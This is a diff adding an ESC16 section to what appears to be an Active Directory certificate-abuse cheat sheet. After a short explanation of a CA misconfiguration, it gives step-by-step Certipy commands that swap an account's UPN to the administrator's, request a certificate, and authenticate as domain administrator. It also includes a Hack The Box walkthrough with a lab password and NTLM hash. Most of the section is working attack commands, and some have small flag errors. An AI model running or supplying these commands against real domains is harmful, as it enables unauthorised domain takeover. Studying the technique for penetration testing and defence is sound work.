@@ -584,3 +584,46 @@ certipy -req -u user@domain.com -p 'P@ssw0rd' --application-policies "1.3.6.1.4.
 certipy -req -u user@domain.com -p 'P@ssw0rd' -on-behalf-of DOMAIN\\Administrator -Template User -ca "Lab Root CA" -pfx user.pfx -dc-ip 10.10.10.10 -target-ip 10.10.10.11
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
 ```
+
+## [ESC16: Security Extension Disabled on CA (Globally)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
+
+ESC16 describes a misconfiguration where the CA itself is globally configured to disable the inclusion of the szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2) security extension in all certificates it issues. This SID extension, introduced with the May 2022 security updates (KB5014754), is vital for "strong certificate mapping", enabling DCs to reliably map a certificate to a user or computer account's SID for authentication.  
+
+**Requirements**  
+- Certificate Security Extensions is disabled  
+- Disabled Extensions contains the OID '1.3.6.1.4.1.311.25'  
+
+**Exploitation**  
+ * Exploitation with certipy  
+   ```bash
+   # Change UPN
+   certipy account -u '<owneduser@domain>' -p '<owneduserpassword>' -target '<DC>' -upn '<target upn to add to an owned user>' -user '<another owned user>' update
+
+   # Request Cert
+   certipy req -dc-ip '<DC IP>' -u '<other owned user from previous step>' -p or -h '<password or hash>' -target '<DC Hname>' -ca '<CA FQDN>' -template '<vulnerable template>'
+
+   # Restore UPN
+   certipy account -u '<owneduser@domain>' -p '<owneduserpassword>' -p '<owneduserpassword>' -target '<DC HName>' -upn '<original UPN>' -user '<other owned user>' update
+
+   # Authenticate
+   certipy auth -pfx '<target UPN pfx>' -domain '<domain>'
+   
+   # This should land you with a ccache that you can use.
+   ```
+ * Real life Example exploitation from HTB machine.  
+   ```bash
+   # Add ourself to a group that has generic right over a user. In this example, ca_svc.
+   net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
+
+   # Change UPN
+   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target 'dc01.fluffy.htb' -upn 'administrator@fluffy.htb' -user 'ca_svc' update
+
+   # Request cert
+   certipy-ad req -dc-ip 'x.x.x.x' -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+
+   # Restore UPN
+   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target 'dc01.fluffy.htb' -upn 'ca_svc' -user 'ca_svc' update
+
+   # Authenticate
+   certipy-ad auth -pfx administrator.pfx -domain fluffy.htb
+   ```
